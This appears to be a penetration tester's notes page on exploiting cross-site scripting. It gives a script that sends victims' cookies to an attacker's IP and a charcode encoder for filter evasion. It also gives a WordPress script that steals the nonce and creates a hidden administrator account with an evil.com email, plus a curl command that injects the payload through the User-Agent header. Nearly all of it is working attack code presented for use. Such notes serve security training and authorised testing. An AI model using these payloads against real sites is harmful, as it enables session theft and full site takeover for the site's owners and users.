---
tags:
  - Exploitation
  - Foundational
  - HTTP
  - Initial_Access
  - Python
  - Web_Application
---

## Advanced Exploitation

### Cookie Stealing
> [!warning] Check for **HttpOnly** flag - prevents JavaScript access. If not set, cookies can be stolen via XSS.

#### Steal Cookie via Image Request
```html
<script>new Image().src="http://<AttackerIP>/steal?c="+document.cookie;</script>
```

### Encoded Payloads
> Encode payload to avoid bad character issues.

#### JavaScript Encoding Function
```javascript
function encode_to_javascript(string) {
    var output = '';
    for(pos = 0; pos < string.length; pos++) {
        output += string.charCodeAt(pos);
        if(pos != (string.length - 1)) {
            output += ",";
        }
    }
    return output;
}
```

#### Execute Encoded Payload
```html
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

### WordPress Privilege Escalation
> [!danger] JavaScript to steal nonce and create new admin user.

#### Create Admin Script
```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@evil.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

> [!tip] Use **jscompress.com** to minify payload to one line before encoding.

#### Inject via User-Agent
```bash
curl -i http://<Target> --user-agent "<script>eval(String.fromCharCode(<EncodedPayload>))</script>"
```
